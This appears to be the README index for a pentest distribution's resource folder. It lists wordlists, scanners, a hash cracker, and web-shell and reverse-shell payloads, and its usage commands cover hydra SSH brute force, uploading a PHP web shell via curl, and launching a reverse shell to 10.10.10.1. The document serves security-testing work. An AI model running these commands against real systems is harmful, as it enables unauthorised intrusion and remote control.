# NullSec Linux - Module Resources Index

## Directory Structure

```
resources/
├── wordlists/
│   ├── passwords/
│   │   ├── common-passwords.txt (50 entries)
│   │   └── rockyou-top1000.txt (100 entries)
│   ├── usernames/
│   │   └── common-usernames.txt (40 entries)
│   ├── subdomains/
│   │   └── common-subdomains.txt (100 entries)
│   ├── directories/
│   │   └── common-directories.txt (50 entries)
│   ├── files/
│   │   └── common-files.txt (40 entries)
│   ├── fuzzing/
│   │   ├── api-endpoints.txt (40 entries)
│   │   ├── sql-injection.txt (25 payloads)
│   │   └── xss-payloads.txt (20 payloads)
│   └── tokens/
│       └── api-keys.txt (20 patterns)
│
├── scripts/
│   ├── python/
│   │   ├── http_client.py - HTTP client with retry logic
│   │   ├── port_scanner.py - Multi-threaded port scanner
│   │   ├── subdomain_enum.py - Subdomain enumeration
│   │   ├── hash_cracker.py - Multi-algorithm hash cracker
│   │   └── payload_gen.py - Exploit payload generator
│   ├── ruby/
│   │   └── web_crawler.rb - Web crawler for recon
│   ├── go/
│   │   └── fast_scanner.go - Ultra-fast network scanner
│   ├── powershell/
│   │   └── Invoke-PortScan.ps1 - PowerShell port scanner
│   └── bash/
│       └── (helper functions included in modules)
│
└── payloads/
    ├── web/
    │   ├── simple-shell.php - PHP web shell
    │   ├── simple-shell.jsp - JSP web shell
    │   └── simple-shell.aspx - ASPX web shell
    └── network/
        ├── reverse-shell.sh - Bash reverse shell
        └── reverse-shell.py - Python reverse shell
```

## Usage Examples

### Using Wordlists in Modules

```bash
# Password cracking
hydra -L $RESOURCES_DIR/wordlists/usernames/common-usernames.txt \
      -P $RESOURCES_DIR/wordlists/passwords/common-passwords.txt \
      ssh://target.com

# Directory bruteforce
gobuster dir -u http://target.com \
             -w $RESOURCES_DIR/wordlists/directories/common-directories.txt

# Subdomain enumeration
python3 $RESOURCES_DIR/scripts/python/subdomain_enum.py target.com
```

### Using Helper Scripts

```bash
# Port scanning
python3 $RESOURCES_DIR/scripts/python/port_scanner.py 192.168.1.1

# Hash cracking
python3 $RESOURCES_DIR/scripts/python/hash_cracker.py \
        5f4dcc3b5aa765d61d8327deb882cf99 \
        $RESOURCES_DIR/wordlists/passwords/rockyou-top1000.txt

# Web crawling
ruby $RESOURCES_DIR/scripts/ruby/web_crawler.rb http://target.com
```

### Using Payloads

```bash
# Deploy web shell
curl -X POST http://target.com/upload.php \
     -F "file=@$RESOURCES_DIR/payloads/web/simple-shell.php"

# Reverse shell
python3 $RESOURCES_DIR/payloads/network/reverse-shell.py 10.10.10.1 4444
```

## Environment Variable

Add to your ~/.bashrc or module scripts:

```bash
export NULLSEC_RESOURCES="$HOME/nullsec/resources"
export NULLSEC_WORDLISTS="$NULLSEC_RESOURCES/wordlists"
export NULLSEC_SCRIPTS="$NULLSEC_RESOURCES/scripts"
export NULLSEC_PAYLOADS="$NULLSEC_RESOURCES/payloads"
```

## Extending Resources

To add more wordlists:
1. Download wordlists to appropriate subdirectory
2. Update this INDEX.md
3. Reference in module scripts

To add more scripts:
1. Create script in language-specific directory
2. Make executable: chmod +x script.py
3. Test standalone functionality
4. Integrate into modules

## Resource Statistics

- **Total Wordlists**: 10 files
- **Total Wordlist Entries**: ~400+
- **Helper Scripts**: 8 scripts across 4 languages
- **Payloads**: 5 shells and exploits
- **Total Size**: ~100KB (compact and efficient)

---

**Maintained by:** NullSec Linux Development Team
**Last Updated:** January 2026
**Version:** 1.0
